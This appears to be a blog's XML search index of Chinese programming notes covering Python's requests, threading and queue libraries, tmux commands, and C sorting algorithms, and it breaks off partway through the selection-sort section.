<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python库总结]]></title>
    <url>%2F2020%2F09%2F04%2F2020.09.04%EF%BC%88148%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 requests 库 相关链接 1.发送请求 get 请求 1234567891011121314151617181920import requests# 头部信息header = &#123; 'Accept': '*/*', 'Referer': 'http://www.baidu.com', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; ', 'Cache-Control': 'no-cache',&#125;# 参数信息para = &#123; 'key1': 'value1', 'key2': 'value2', 'key3': None,&#125;# cookiescookies = dict(cookies_are='working')r = requests.get(url, headers=header, params = para, allow_redirects=False, cookies=cookies, timeout=60) post 请求 1234567891011import requests# 除了参数信息的方式不一样外，其余信息和get一样# 头部信息payload = &#123; 'key1': 'value1', 'key2': 'value2', 'key3': None,&#125;r = requests.get(url, data=header, params = para, allow_redirects=False, timeout=60) 请求的参数 ① 参数 具体的可以看上面 ② Cookies 如果某个响应中包含一些 cookie，你可以快速访问它们： 1234&gt;&gt;&gt; url = 'http://example.com/some/cookie/setting/url'&gt;&gt;&gt; r = requests.get(url)&gt;&gt;&gt; r.cookies['example_cookie_name']'example_cookie_value' 要想发送你的cookies到服务器，可以使用 cookies 参数： 12345&gt;&gt;&gt; url = 'http://httpbin.org/cookies'&gt;&gt;&gt; cookies = dict(cookies_are='working')&gt;&gt;&gt; r = requests.get(url, cookies=cookies)&gt;&gt;&gt; r.text'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;' ③ 重定向 默认情况下，除了 HEAD, Requests 会自动处理所有重定向。 可以使用响应对象的 history 方法来追踪重定向。 Response.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。 例如，Github 将所有的 HTTP 请求重定向到 HTTPS： 12345678910&gt;&gt;&gt; r = requests.get('http://github.com')&gt;&gt;&gt; r.url'https://github.com/'&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; r.history[&lt;Response [301]&gt;] 如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 allow_redirects 参数禁用重定向处理： 12345&gt;&gt;&gt; r = requests.get('http://github.com', allow_redirects=False)&gt;&gt;&gt; r.status_code301&gt;&gt;&gt; r.history[] ④ 超时 你可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应： 1234&gt;&gt;&gt; requests.get('http://github.com', timeout=0.001)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;requests.exceptions.Timeout: HTTPConnectionPool(host='github.com', port=80): Request timed out. (timeout=0.001) 注意：timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out. 2.requests库主要的7个方法 方法 说明 requests.request() 构造一个请求，支撑一下各方法的基础方法 requests.get() 获取HTML网页的主要方法，对应HTTP的GET requests.post() 向HTML网页提交POST请求方法，对应HTTP的POST requests.put() 向HTML网页提交PUT请求的方法，对应HTTP的RUT requests.head() 获取HTML网页头的信息方法，对应HTTP的HEAD requests.patch() 向HTML网页提交局部修改请求，对应于HTTP的PATCH requests.delete() 向HTML页面提交删除请求,对应HTTP的DELETE 3.response对象的属性 属性 说明 r.status_code HTTP请求的返回状态 r.text HTTP响应内容的字符串形式，即：url对应的页面内容 r.encoding 从HTTP header中猜测的响应内容编码方式 r.apparent_encoding 从内容中分析出的响应内容编码方式（备选编码方式） r.content HTTP响应内容的二进制形式 r.headers 获得头部信息 r.url 获得链接 0x02 threading 库（多线程） 1import threading 我们要创建 Thread 对象,然后让它们运行，每个 Thread 对象代表一个线程，在每个线程中我们可以让程序处理不同的任务，这就是多线程编程。 值得注意的是，程序运行时默认就是在主线程上 创建 Thread 对象有 2 种手段。 直接创建 Thread ，将一个 callable 对象从类的构造器传递进去，这个 callable 就是回调函数，用来处理任务。 编写一个自定义类继承 Thread，然后复写 run() 方法，在 run() 方法中编写任务处理代码，然后创建这个 Thread 的子类。 1.创建 Thread 对象 1class threading.Thread(group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *, daemon=None) group 应该为 None；为了日后扩展 ThreadGroup 类实现而保留。 target 是用于 run() 方法调用的可调用对象。默认是 None，表示不需要调用任何方法。 name 是线程名称。默认情况下，由 “Thread-N” 格式构成一个唯一的名称，其中 N 是小的十进制数。 args 是用于调用目标函数的参数元组。默认是 ()。 kwargs 是用于调用目标函数的关键字参数字典。默认是 {}。 如果不是 None，daemon 参数将显式地设置该线程是否为守护模式。 如果是 None (默认值)，线程将继承当前线程的守护模式属性。 如果子类型重载了构造函数，它一定要确保在做任何事前，先发起调用基类构造器(Thread.__init__())。 2.threading.Thread 的方法 先说几个最常用的，以后再进行补充 ① threading.active_count() / threading.activeCount() 返回当前存活的线程类 Thread 对象。返回的计数等于 enumerate() 返回的列表长度。 ② threading.current_thread() / threading.currentThread() 返回当前对应调用者的控制线程的 Thread 对象。如果调用者的控制线程不是利用 threading 创建，会返回一个功能受限的虚拟线程对象。其还可以调用几个实例化方法： isAlive(): 返回线程是否活动的 getName(): 返回线程名 setName(): 设置线程名 name(): 返回当前线程的名称 1234threading.current_thread().setName("主线程") #设置线程名字print(threading.current_thread().isAlive()) #线程是不是活动的print("当前线程",threading.current_thread())print("获取当前线程名字",threading.current_thread().getName() ③ start() 开始线程活动。它在一个线程里最多只能被调用一次。它安排对象的 run() 方法在一个独立的控制进程中调用。如果同一个线程对象中调用这个方法的次数大于一次，会抛出 RuntimeError 。 ④ run() 代表线程活动的方法。你可以在子类型里重载这个方法。 标准的 run() 方法会对作为 target 参数传递给该对象构造器的可调用对象（如果存在）发起调用，并附带从 args 和 kwargs 参数分别获取的位置和关键字参数。 ⑤ join(timeout=None)` 等待，直到线程终结。这会阻塞调用这个方法的线程，直到被调用 join() 的线程终结 – 不管是正常终结还是抛出未处理异常 – 或者直到发生超时，超时选项是可选的。 当 timeout 参数存在而且不是 None 时，它应该是一个用于指定操作超时的以秒为单位的浮点数或者分数。因为 join() 总是返回 None ，所以你一定要在 join() 后调用 is_alive() 才能判断是否发生超时 – 如果线程仍然存活，则 join() 超时。 当 timeout 参数不存在或者是 None ，这个操作会阻塞直到线程终结。 一个线程可以被 join() 很多次。 如果尝试加入当前线程会导致死锁， join() 会引起 RuntimeError 异常。如果尝试 join() 一个尚未开始的线程，也会抛出相同的异常。 ⑥ daemon 一个表示这个线程是（True）否（False）守护线程的布尔值。一定要在调用 start() 前设置好，不然会抛出 RuntimeError 。初始值继承于创建线程；主线程不是守护线程，因此主线程创建的所有线程默认都是 daemon = False。下面先看一段代码： 12345678910111213141516171819import threadingimport timedef test(): for i in range(5): print(threading.current_thread().name+' test ',i) time.sleep(2)thread = threading.Thread(target=test,name='TestThread')# thread = threading.Thread(target=test,name='TestThread',daemon=True)thread.start()for i in range(5): print(threading.current_thread().name+' main ', i) print(thread.name+' is alive ', thread.isAlive()) time.sleep(1) 程序运行结果如下： 123456789101112131415TestThread test 0MainThread main 0TestThread is alive TrueMainThread main 1TestThread is alive TrueTestThread test 1MainThread main 2TestThread is alive TrueMainThread main 3TestThread is alive TrueTestThread test 2MainThread main 4TestThread is alive TrueTestThread test 3TestThread test 4 MainThread 没有代码运行的时候，TestThread 还在运行。这是因为 MainThread 在等待其他线程的结束。TestThread 中 daemon 属性默认是 False，这使得 MainThread 需要等待它的结束，自身才结束。**如果要达到，MainThread 结束，子线程也立马结束，怎么做呢？**其实很简单，只需要在子线程调用 start() 方法之前设置 daemon 就好了。当然也可以在子线程的构造器中传递 daemon 的值为 True。 12thread = threading.Thread(target=test,name='TestThread',daemon=True)# thread.setDaemon(True) 3.threading锁问题 1self.lock = threading.RLock() 其方法有： acquire(blocking=True, timeout=-1) 可以阻塞或非阻塞地获得锁。当无参数调用时： 如果这个线程已经拥有锁，递归级别增加一，并立即返回。否则，如果其他线程拥有该锁，则阻塞至该锁解锁。一旦锁被解锁(不属于任何线程)，则抢夺所有权，设置递归等级为一，并返回。如果多个线程被阻塞，等待锁被解锁，一次只有一个线程能抢到锁的所有权。在这种情况下，没有返回值。当发起调用时将 blocking 参数设为真值，则执行与无参数调用时一样的操作，然后返回 True。当发起调用时将 blocking 参数设为假值，则不进行阻塞。 如果一个无参数调用将要阻塞，则立即返回 False；在其他情况下，执行与无参数调用时一样的操作，然后返回 True。当发起调用时将浮点数的 timeout 参数设为正值时，只要无法获得锁，将最多阻塞 timeout 所指定的秒数。 如果已经获得锁则返回 True，如果超时则返回假值。在 3.2 版更改: 新的 timeout 形参。 release() 释放锁，自减递归等级。如果减到零，则将锁重置为非锁定状态(不被任何线程拥有)，并且，如果其他线程正被阻塞着等待锁被解锁，则仅允许其中一个线程继续。如果自减后，递归等级仍然不是零，则锁保持锁定，仍由调用线程拥有。只有当前线程拥有锁才能调用这个方法。如果锁被释放后调用这个方法，会引起 RuntimeError 异常。没有返回值。 12345def _writeReult(self, result): self.lock.acquire() # 获取锁 with open(self.oFileName, "a+") as f: f.write(result + "\n") # 写入文件 self.lock.release() # 释放锁 4.thread继承问题 前面讲过，直接初始化一个 Thread，然后，现在还有一种方式就是自定义一个 Thread 的子类，然后复写它的 run() 方法。 1234567891011121314151617181920import threadingimport timeclass TestThread(threading.Thread): def __init__(self,name=None): threading.Thread.__init__(self,name=name) def run(self): for i in range(5): print(threading.current_thread().name + ' test ', i) time.sleep(1)thread = TestThread(name='TestThread')thread.start()for i in range(5): print(threading.current_thread().name+' main ', i) print(thread.name+' is alive ', thread.isAlive()) time.sleep(1) 上面的代码，我们自定义了 TestThread 这个类，然后继承了 threading.Thread。 只有在 run() 方法中处理逻辑。最终代码运行结果如下： 12345678910111213141516TestThread test 0MainThread main 0TestThread is alive TrueTestThread test 1MainThread main 1TestThread is alive TrueTestThread test 2MainThread main 2TestThread is alive TrueMainThread main 3TestThread is alive TrueTestThread test 3MainThread main 4TestThread test 4TestThread is alive True123456789101112131415 5.相关问题 run()和start()的区别是什么？ 如何继承构造线程？ 6.参考文章 Python多线程编程(一）：threading 模块 Thread 类的用法详解 python多线程详解（超详细） 0x03 queue 库 12import queue q = queue.Queue() 1.queue的常用方法 ① q.put(item, block=True, timeout=None) item：放入队列中的数据元素。 block：当队列中元素个数达到上限继续往里放数据时：如果 block=False，直接引发 queue.Full 异常；如果 block=True，且 timeout=None，则一直等待直到有数据出队列后可以放入数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有位置放入数据就引发 queue.Full 异常。 timeout：设置超时时间。 ② q.put_nowait(item) 相当于 Queue.put(item, block=False)，当队列中元素个数达到上限继续往里放数据时直接引发 queue.Full 异常。 ③ q.get(block=True, timeout=None) 从队列中取出数据并返回该数据内容。 block：当队列中没有数据元素继续取数据时：如果 block=False，直接引发 queue.Empty 异常；如果 block=True，且 timeout=None，则一直等待直到有数据入队列后可以取出数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有数据放入的话就引发 queue.Empty 异常。 timeout：设置超时时间。 ④ q.get_nowait() 相当于 Queue.get(block=False)block，当队列中没有数据元素继续取数据时直接引发 queue.Empty 异常。 ⑤ q.qsize() 返回队列中数据元素的个数。 ⑥ q..empty() 如果队列为空，返回 True，否则返回 False。 示例如下： 12345import queueq = queue.Queue()print(q.empty()) # 对列为空，返回 Trueq.put('python-100') # 在队列中插入元素 'python-100'print(q.empty()) # 对列不为空，返回 False ⑦ q.full() 如果队列中元素个数达到上限，返回 True，否则返回 False。 2.queue 的异常 ① queue.Full 异常 当队列数据元素容量达到上限时，继续往队列中放入数据会引发 queue.Empty 异常，主要是不正当使用 put() 和 put_nowait() 引起的。 示例如下： 123456789import queuetry: q = queue.Queue(3) # 设置队列上限为3 q.put('python') # 在队列中插入字符串 'python' q.put('-') # 在队列中插入字符串 '-' q.put('100') # 在队列中插入字符串 '100' q.put('stay hungry, stay foolish', block=False) # 队列已满，继续往队列中放入数据，引发 queue.Full 异常except queue.Full: print('queue.Full') ② queue.Empty 异常 当队列中没有数据元素时，取出队列中的数据会引发 queue.Empty 异常，主要是不正当使用 get() 和 get_nowait() 引起的。 示例如下： 12345678910import queuetry: q = queue.Queue(3) # 设置队列上限为3 q.put('python') # 在队列中插入字符串 'python' q.put('-') # 在队列中插入字符串 '-' q.put('100') # 在队列中插入字符串 '100' for i in range(4): # 从队列中取数据，取出次数为4次，引发 queue.Empty 异常 print(q.get(block=False))except queue.Empty: print('queue.Empty')]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python多线程介绍]]></title>
    <url>%2F2020%2F09%2F04%2F2020.09.04%EF%BC%88149%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 什么是多线程？ 在计算机编程中，一个基本的概念就是同时对多个任务加以控制。许多程序设计问题都要求程序能够停下手头的工作，改为处理其他一些问题，再返回主进程。可以通过多种途径达到这个目的。最开始的时候，那些掌握机器低级语言的程序员编写一些“中断服务例程”，主进程的暂停是通过硬件级的中断实现的。尽管这是一种有用的方法，但编出的程序很难移植，由此造成了另一类的代价高昂问题。中断对那些实时性很强的任务来说是很有必要的。但对于其他许多问题，只要求将问题划分进入独立运行的程序片断中，使整个程序能更迅速地响应用户的请求。**最开始，线程只是用于分配单个处理器的处理时间的一种工具。但假如操作系统本身支持多个处理器，那么每个线程都可分配给一个不同的处理器，真正进入“并行运算”状态。**从程序设计语言的角度看，多线程操作最有价值的特性之一就是程序员不必关心到底使用了多少个处理器。程序在逻辑意义上被分割为数个线程;假如机器本身安装了多个处理器，那么程序会运行得更快，毋需作出任何特殊的调校。根据前面的论述，大家可能感觉线程处理非常简单。但必须注意一个问题：共享资源!如果有多个线程同时运行，而且它们试图访问相同的资源，就会遇到一个问题。举个例子来说，两个线程不能将信息同时发送给一台打印机。为解决这个问题，对那些可共享的资源来说(比如打印机)，它们在使用期间必须进入锁定状态。所以一个线程可将资源锁定，在完成了它的任务后，再解开(释放)这个锁，使其他线程可以接着使用同样的资源。多线程是为了同步完成多项任务，不是为了提高运行效率，而是为了提高资源使用效率来提高系统的效率。线程是在同一时间需要完成多项任务的时候实现的。一个采用了多线程技术的应用程序可以更好地利用系统资源。其主要优势在于充分利用了CPU的空闲时间片，可以用尽可能少的时间来对用户的要求做出响应，使得进程的整体运行效率得到较大提高，同时增强了应用程序的灵活性。更为重要的是，由于同一进程的所有线程是共享同一内存，所以不需要特殊的数据传送机制，不需要建立共享存储区或共享文件，从而使得不同任务之间的协调操作与运行、数据的交互、资源的分配等问题更加易于解决。 1import threading from threading import Lock,Thread import time,os 0x01 python多线程详解 1.什么是线程？ 线程也叫轻量级进程，是操作系统能够进行运算调度的最小单位，它被包涵在进程之中，是进程中的实际运作单位。线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行。 2.为什么要使用多线程？ 线程在程序中是独立的、并发的执行流。与分隔的进程相比，进程中线程之间的隔离程度要小，它们共享内存、文件句柄 和其他进程应有的状态。 因为线程的划分尺度小于进程，使得多线程程序的并发性高。进程在执行过程之中拥有独立的内存单元，而多个线程共享 内存，从而极大的提升了程序的运行效率。 线程比进程具有更高的性能，这是由于同一个进程中的线程都有共性，多个线程共享一个进程的虚拟空间。线程的共享环境 包括进程代码段、进程的共有数据等，利用这些共享的数据，线程之间很容易实现通信。操作系统在创建进程时，必须为改进程分配独立的内存空间，并分配大量的相关资源，但创建线程则简单得多。因此，使用多线程 来实现并发比使用多进程的性能高得要多。 总结起来，使用多线程编程具有如下几个优点： 进程之间不能共享内存，但线程之间共享内存非常容易。 操作系统在创建进程时，需要为该进程重新分配系统资源，但创建线程的代价则小得多。因此使用多线程来实现多任务并发执行比使用多进程的效率高 。 python语言内置了多线程功能支持，而不是单纯地作为底层操作系统的调度方式，从而简化了python的多线程编程。 3.普通创建方式 123456789101112131415def run(n): print('task',n) time.sleep(1) print('2s') time.sleep(1) print('1s') time.sleep(1) print('0s') time.sleep(1)if __name__ == '__main__': t1 = threading.Thread(target=run,args=('t1',)) # target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在 t2 = threading.Thread(target=run,args=('t2',)) t1.start() t2.start() 4.自定义线程 继承threading.Thread来定义线程类，其本质是重构Thread类中的run方法 12345678910111213141516171819class MyThread(threading.Thread): def __init__(self,n): super(MyThread,self).__init__() #重构run函数必须写 self.n = n def run(self): print('task',self.n) time.sleep(1) print('2s') time.sleep(1) print('1s') time.sleep(1) print('0s') time.sleep(1)#if __name__ == '__main__': t1 = MyThread('t1') t2 = MyThread('t2') t1.start() t2.start() 5.守护线程 下面这个例子，这里使用setDaemon(True)把所有的子线程都变成了主线程的守护线程，因此当主线程结束后&lt;子线程也会随之结束，所以当主线程结束后，整个程序就退出了。 所谓’线程守护’，就是主线程不管该线程的执行情况，只要是其他子线程结束且主线程执行完毕，主线程都会关闭。也就是说:主线程不等待该守护线程的执行完再去关闭。 1234567891011121314def run(n): print('task',n) time.sleep(1) print('3s') time.sleep(1) print('2s') time.sleep(1) print('1s')#if __name__ == '__main__': t=threading.Thread(target=run,args=('t1',)) t.setDaemon(True) t.start() print('end') 通过执行结果可以看出，设置守护线程之后，当主线程结束时，子线程也将立即结束，不再执行 ‘’’ ‘’’ 6.主线程等待子线程结束 为了让守护线程执行结束之后，主线程再结束，我们可以使用join方法，让主线程等待子线程执行 1234567891011121314def run(n): print('task',n) time.sleep(2) print('5s') time.sleep(2) print('3s') time.sleep(2) print('1s')if __name__ == '__main__': t=threading.Thread(target=run,args=('t1',)) t.setDaemon(True) #把子线程设置为守护线程，必须在start()之前设置 t.start() t.join() #设置主线程等待子线程结束 print('end') 7.多线程共享全局变量 线程时进程的执行单元，进程时系统分配资源的最小执行单位，所以在同一个进程中的多线程是共享资源的。 1234567891011121314151617g_num = 100def work1(): global g_num for i in range(3): g_num+=1 print('in work1 g_num is : %d' % g_num)#def work2(): global g_num print('in work2 g_num is : %d' % g_num)#if __name__ == '__main__': t1 = threading.Thread(target=work1) t1.start() time.sleep(1) t2=threading.Thread(target=work2) t2.start() 由于线程之间是进行随机调度，并且每个线程可能只执行n条执行之后，当多个线程同时修改同一条数据时可能会出现脏数据， 所以出现了线程锁，即同一时刻允许一个线程执行操作。线程锁用于锁定资源，可以定义多个锁，像下面的代码，当需要独占 某一个资源时，任何一个锁都可以锁定这个资源，就好比你用不同的锁都可以把这个相同的门锁住一样。 由于线程之间是进行随机调度的，如果有多个线程同时操作一个对象，如果没有很好地保护该对象，会造成程序结果的不可预期， 我们因此也称为“线程不安全”。 为了防止上面情况的发生，就出现了互斥锁（Lock） 8.互斥锁（Lock） 123456789101112131415161718def work(): global n lock.acquire() temp = n time.sleep(0.1) n = temp-1 lock.release()if __name__ == '__main__': lock = Lock() n = 100 l = [] for i in range(100): p = Thread(target=work) l.append(p) p.start() for p in l: p.join() 9.递归锁 RLcok类的用法和Lock类一模一样，但它支持嵌套，在多个锁没有释放的时候一般会使用RLock类 1234567891011121314def func(lock): global gl_num lock.acquire() gl_num += 1 time.sleep(1) print(gl_num) lock.release()#if __name__ == '__main__': gl_num = 0 lock = threading.RLock() for i in range(10): t = threading.Thread(target=func,args=(lock,))# t.start() 10.信号量（BoundedSemaphore类） 互斥锁同时只允许一个线程更改数据，而Semaphore是同时允许一定数量的线程更改数据，比如厕所有3个坑，那最多只允许3个人上厕所，后面的人只能等里面有人出来了才能再进去。 1234567891011121314151617def run(n,semaphore): semaphore.acquire() #加锁 time.sleep(3) print('run the thread:%s\n' % n) semaphore.release() #释放#if __name__== '__main__': num=0 semaphore = threading.BoundedSemaphore(5) #最多允许5个线程同时运行 for i in range(22): t = threading.Thread(target=run,args=('t-%s' % i,semaphore)) t.start() while threading.active_count() !=1: pass else: print('----------all threads done-----------') 11.事件 python线程的事件用于主线程控制其他线程的执行，事件是一个简单的线程同步对象，其主要提供以下的几个方法： clear将flag设置为 False set将flag设置为 True is_set判断是否设置了flag wait会一直监听flag，如果没有检测到flag就一直处于阻塞状态 事件处理的机制：全局定义了一个Flag，当Flag的值为False，那么event.wait()就会阻塞，当flag值为True，那么event.wait()便不再阻塞。 12345678910111213141516171819202122232425262728293031323334353637event = threading.Event()def lighter(): count = 0 event.set() #初始者为绿灯 while True: if 5 &lt; count &lt;=10: event.clear() #红灯，清除标志位 print("\33[41;lmred light is on...\033[0m]") elif count &gt; 10: event.set() #绿灯，设置标志位 count = 0 else: print('\33[42;lmgreen light is on...\033[0m') time.sleep(1) count += 1def car(name): while True: if event.is_set(): #判断是否设置了标志位 print('[%s] running.....'%name) time.sleep(1) else: print('[%s] sees red light,waiting...'%name) event.wait() print('[%s] green light is on,start going...'%name)# startTime = time.time()light = threading.Thread(target=lighter,)light.start()car = threading.Thread(target=car,args=('MINT',))car.start()endTime = time.time()# print('用时：',endTime-startTime) 0x02 GIL 全局解释器 在非python环境中，单核情况下，同时只能有一个任务执行。多核时可以支持多个线程同时执行。但是在python中，无论有多少个核 同时只能执行一个线程。究其原因，这就是由于GIL的存在导致的。GIL的全程是全局解释器，来源是python设计之初的考虑，为了数据安全所做的决定。某个线程想要执行，必须先拿到GIL，我们可以把GIL看做是“通行证”，并且在一个python进程之中，GIL只有一个。拿不到线程的通行证，并且在一个python进程中，GIL只有一个，拿不到通行证的线程，就不允许进入CPU执行。GIL只在cpython中才有，因为cpython调用的是c语言的原生线程，所以他不能直接操作cpu，而只能利用GIL保证同一时间只能有一个线程拿到数据。而在pypy和jpython中是没有GIL的python在使用多线程的时候，调用的是c语言的原生过程。 python针对不同类型的代码执行效率也是不同的： CPU密集型代码（各种循环处理、计算等），在这种情况下，由于计算工作多，ticks技术很快就会达到阀值，然后出发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对CPU密集型代码并不友好。 IO密集型代码（文件处理、网络爬虫等设计文件读写操作），多线程能够有效提升效率（单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序的执行 效率）。所以python的多线程对IO密集型代码比较友好。 ‘’’ ‘’’ 主要要看任务的类型，我们把任务分为I/O密集型和计算密集型，而多线程在切换中又分为I/O切换和时间切换。如果任务属于是I/O密集型， 若不采用多线程，我们在进行I/O操作时，势必要等待前面一个I/O任务完成后面的I/O任务才能进行，在这个等待的过程中，CPU处于等待 状态，这时如果采用多线程的话，刚好可以切换到进行另一个I/O任务。这样就刚好可以充分利用CPU避免CPU处于闲置状态，提高效率。但是 如果多线程任务都是计算型，CPU会一直在进行工作，直到一定的时间后采取多线程时间切换的方式进行切换线程，此时CPU一直处于工作状态， 此种情况下并不能提高性能，相反在切换多线程任务时，可能还会造成时间和资源的浪费，导致效能下降。这就是造成上面两种多线程结果不能的解释。 结论：I/O密集型任务，建议采取多线程，还可以采用多进程+协程的方式(例如:爬虫多采用多线程处理爬取的数据)；对于计算密集型任务，python此时就不适用了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Tmux工具使用总结]]></title>
    <url>%2F2020%2F08%2F29%2F2020.08.29%EF%BC%88147%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 Tmux简介 tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本文不再重复。tmux之所以受人们喜爱，主要得益于以下三处功能： 丝滑分屏（split）：虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。 保护现场（attach）：即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。 会话共享（适用于结对编程或远程教学），将 tmux 会话的地址分享给他人，这样他们就可以通过 SSH 接入该会话。如果你要给同事演示远程服务器的操作，他不必直勾勾地盯着你的屏幕，借助tmux，他完全可以进入到你的会话，然后静静地看着他桌面上你风骚的键盘走位，只要他愿意，甚至还可以录个屏。 0x01 Tmux快捷指令 关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为Ctrl+b，输入完前缀过后，控制台激活，命令按键才能生效。 表一：系统指令 前缀 指令 描述 Ctrl+b ? 显示快捷键帮助文档 Ctrl+b d 断开当前会话 Ctrl+b D 选择要断开的会话 Ctrl+b Ctrl+z 挂起当前会话 Ctrl+b r 强制重载当前会话 Ctrl+b s 显示会话列表用于选择并切换 Ctrl+b : 进入命令行模式，此时可直接输入ls等命令 Ctrl+b [ 进入复制模式，按q退出 Ctrl+b ] 粘贴复制模式中复制的文本 Ctrl+b ~ 列出提示信息缓存 表二：窗口（window）指令。 前缀 指令 描述 Ctrl+b c 新建窗口 Ctrl+b &amp; 关闭当前窗口（关闭前需输入y or n确认） Ctrl+b 0~9 切换到指定窗口 Ctrl+b p 切换到上一窗口 Ctrl+b n 切换到下一窗口 Ctrl+b w 打开窗口列表，用于且切换窗口 Ctrl+b , 重命名当前窗口 Ctrl+b . 修改当前窗口编号（适用于窗口重新排序） Ctrl+b f 快速定位到窗口（输入关键字匹配窗口名称） 表三：面板（pane）指令 前缀 指令 描述 Ctrl+b &quot; 当前面板上下一分为二，下侧新建面板 Ctrl+b % 当前面板左右一分为二，右侧新建面板 Ctrl+b x 关闭当前面板（关闭前需输入y or n确认） Ctrl+b z 最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增） Ctrl+b ! 将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效） Ctrl+b ; 切换到最后一次使用的面板 Ctrl+b q 显示面板编号，在编号消失前输入对应的数字可切换到相应的面板 Ctrl+b { 向前置换当前面板 Ctrl+b } 向后置换当前面板 Ctrl+b Ctrl+o 顺时针旋转当前窗口中的所有面板 Ctrl+b 方向键 移动光标切换面板 Ctrl+b o 选择下一面板 Ctrl+b 空格键 在自带的面板布局中循环切换 Ctrl+b Alt+方向键 以5个单元格为单位调整当前面板边缘 Ctrl+b Ctrl+方向键 以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖） Ctrl+b t 显示时钟 0x02 会话管理 新建会话 1$ tmux new -s &lt;session-name&gt; 分离会话 1$ tmux detach 查看会话 123$ tmux ls# or$ tmux list-session 接入会话 12345# 使用会话编号$ tmux attach -t 0# 使用会话名称$ tmux attach -t &lt;session-name&gt; 杀死会话 12345# 使用会话编号$ tmux kill-session -t 0# 使用会话名称$ tmux kill-session -t &lt;session-name&gt; 切换会话 12345# 使用会话编号$ tmux switch -t 0# 使用会话名称$ tmux switch -t &lt;session-name&gt; 重命名会话 1$ tmux rename-session -t 0 &lt;new-name&gt; 0x03 窗口管理 划分窗口 12345# 划分上下两个窗格$ tmux split-window# 划分左右两个窗格$ tmux split-window -h 移动光标 1234567891011# 光标切换到上方窗格$ tmux select-pane -U# 光标切换到下方窗格$ tmux select-pane -D# 光标切换到左边窗格$ tmux select-pane -L# 光标切换到右边窗格$ tmux select-pane -R 交换窗口位置 12345# 当前窗格上移$ tmux swap-pane -U# 当前窗格下移$ tmux swap-pane -D 新建窗口 1234$ tmux new-window# 新建一个指定名称的窗口$ tmux new-window -n &lt;window-name&gt; 切换窗口 12345# 切换到指定编号的窗口$ tmux select-window -t &lt;window-number&gt;# 切换到指定名称的窗口$ tmux select-window -t &lt;window-name&gt; 重命名窗口 1$ tmux rename-window &lt;new-name&gt;]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法总结（C）]]></title>
    <url>%2F2020%2F08%2F28%2F2020.08.28%EF%BC%88146%EF%BC%89%2F</url>
    <content type="text"><![CDATA[C 排序算法 0x00 冒泡排序 1.算法思想冒泡排序的基本思想就是： 从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。 算法的核心在于每次通过两两比较交换位置，选出剩余无序序列里最大（小）的数据元素放到队尾。 2.图解算法 3.算法实现1234567891011121314151617181920#include &lt;stdio.h&gt;void bubble_sort(int arr[], int len) &#123; int i, j, temp; for (i = 0; i &lt; len - 1; i++) for (j = 0; j &lt; len - 1 - i; j++) if (arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; &#125;&#125;int main() &#123; int arr[] = &#123; 22, 34, 3, 32, 82, 55, 89, 50, 37, 5, 64, 35, 9, 70 &#125;; int len = (int) sizeof(arr) / sizeof(*arr); bubble_sort(arr, len); int i; for (i = 0; i &lt; len; i++) printf("%d ", arr[i]); return 0;&#125; 0x01 选择排序 1.算法思想 它的工作原理如下。首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 2.图解算法 